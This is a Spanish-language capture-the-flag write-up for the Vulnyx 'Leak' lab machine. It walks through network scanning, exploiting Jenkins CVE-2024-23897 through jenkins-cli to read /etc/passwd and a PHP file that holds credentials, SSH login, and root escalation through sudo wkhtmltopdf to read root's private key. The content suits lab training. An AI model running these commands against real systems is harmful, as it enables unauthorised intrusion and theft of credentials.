## Vulnyx Leak

### Escaneo de red:

```bash
arp-scan -I eth0 --localnet 
```
```
•(IP-Victima)
```

```bash
nmap -p 80,8080 -sS -sC -sV  -n -Pn (IP-Victima) -oN nmap 
```
```
•80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
•8080/tcp open  http    Jetty 10.0.13
| http-robots.txt: 1 disallowed entry 
```

Puerto 8008 contiene un jenkins

### Fuzzing:

```bash
wfuzz --hc=404 -u http://(IP-Victima):8080/FUZZ -w /usr/share/dirb/wordlists/big.txt
```
```
•about
```

Tenemos un login en `http://(IP-Victima):8080/loginError`

### Identificación del sistema:

```bash
whatweb http://(IP-Victima):8080  
```
```
•Jenkins[2.401.2] 
•Jetty[10.0.13]
```

### Descubrimiento de directorios:

```bash
gobuster dir -u http://(IP-Victima) -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt -x .php 
```
```
•/connect.php
```

### Explotación:

Buscamos exploits/CVE relacionados a Jenkins 2.401.2 y encontramos el CVE-2024-23897

Descargamos el archivo necesario:
```bash
wget http://(IP-Victima):8080/jnlpJars/jenkins-cli.jar
```

Para leer archivos internos:

```bash
java -jar jenkins-cli.jar -s http://(IP-Victima):8080/ -http connect-node "@/etc/passwd"
```

Luego, leemos el archivo `connect.php`:
```bash
java -jar jenkins-cli.jar -s http://(IP-Victima):8080/ -http connect-node "@/var/www/html/connect.php"
```

El código PHP obtenido valida un usuario y contraseña:
```php
$username = "george";
$password = "g***********D";
```

### Acceso a SSH:

```bash
nmap -6 fe80(IPv6-Victima)%etch0
```
```
•22/tcp   open  tcpwrapped
|_ssh-hostkey
```

Accedemos:
```bash
ssh -6 george@fe80:(IPv6-Victima)%eth0
Pass: g*********D
```

### Escalada de privilegios:

```bash
sudo -l
```
```
•/usr/bin/wkhtmltopdf
```

Podemos ejecutar como root un script que convierte html a pdf.

### Lectura de archivos sensibles:

```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
chmod +x pspy64
./pspy64
```

Encontramos:
```bash
•/bin/sh -c /usr/bin/file /root/private.txt
```

Intentamos leer el archivo:
```bash
sudo -u root /usr/bin/wkhtmltopdf /root/private.txt private.pdf
```

### Visualización de archivo sensible:

Montamos un servidor Python para visualizar el contenido:
```bash
python3 -m http.server 5000
```
Accedemos vía navegador a:
```
http://(IP-Victima):5000
```

Copiamos y guardamos el archivo `id_rsa`.

```bash
chmod 600 id_rsa
ssh -6 -i id_rsa root@fe80:(IPv6-Victima)%eth0
```

¡Ahora estamos dentro como root! :D
```
